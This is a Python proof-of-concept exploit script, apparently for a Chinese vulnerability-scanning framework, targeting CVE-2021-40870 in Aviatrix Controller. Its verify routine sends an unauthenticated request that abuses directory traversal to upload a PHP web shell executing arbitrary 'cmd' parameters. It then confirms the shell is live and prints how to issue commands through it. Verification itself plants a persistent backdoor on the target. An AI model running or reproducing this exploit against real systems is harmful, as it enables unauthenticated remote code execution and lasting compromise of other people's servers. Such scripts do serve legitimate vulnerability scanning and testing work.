from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


POC_NAME = "CVE_2021_40870_Aviatrix_Controller"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_40870_Aviatrix_Controller(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0051',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_40870_Aviatrix_Controller',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-09',    # PoC创建时间
        },

        'vul': {
            'Product': 'Aviatrix Controller',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                在 6.5-1804.1922 之前的 Aviatrix Controller 6.x 中发现了一个问题。可以不受限制地上传具有危险类型的文件，这允许未经身份验证的用户通过目录遍历执行任意代码。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-10-15',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        banner = '''

        ___         __    ____   ___ ____  _       _  _    ___   ___ _____ ___  
        / __\/\   /\/__\  |___ \ / _ \___ \/ |     | || |  / _ \ ( _ )___  / _ \ 
        / /   \ \ / /_\_____ __) | | | |__) | |_____| || |_| | | |/ _ \  / / | | |
        / /___  \ V //_|_____/ __/| |_| / __/| |_____|__   _| |_| | (_) |/ /| |_| |
        \____/   \_/\__/    |_____|\___/_____|_|        |_|  \___/ \___//_/  \___/

                                                                [by lUc1f3r11]

                            Use :  python3 osprey.py -t http://site.com/ -v vb_2021_0051
                                                                                

        '''
        print(banner)

        base_url = target
        user = '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'''
        filename = "RCE.php"
        shell = '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''


        headers = {
            "Host": base_url,
            "User-Agent": user,
            "Connection": "close",
            "Content-Length": "109",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip",
        }

        body = f'CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{filename}&data=poc by lUc1f3r11{shell}'

        #resp = req(url, 'get', headers=header, allow_redirects=False)
        resp = requests.post(base_url+'/v1/backend1', headers=headers, data=body, verify=False)
        print(f'[+] shell upload status: {resp.status_code}')
        check_file = requests.get(base_url+'/v1/'+filename, verify=False)
        if check_file.status_code == 200:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = base_url+'/v1/'+filename    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = resp.text
            if verbose:
                highlight("[+] url: " + base_url + " 存在CVE_2021_40870_Aviatrix_Controller RCE漏洞！！！")
                print(f'[+] EXPLOITED {base_url}')
                print('')
                print(f'[+] Go To {base_url}/v1/{filename}')
                print('')
                print('[+] access shell using RCE.php?cmd=[command]')
        else:
            if verbose:
                highlight("[+] url: " + base_url + " 不存在CVE_2021_40870_Aviatrix_Controller RCE漏洞！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)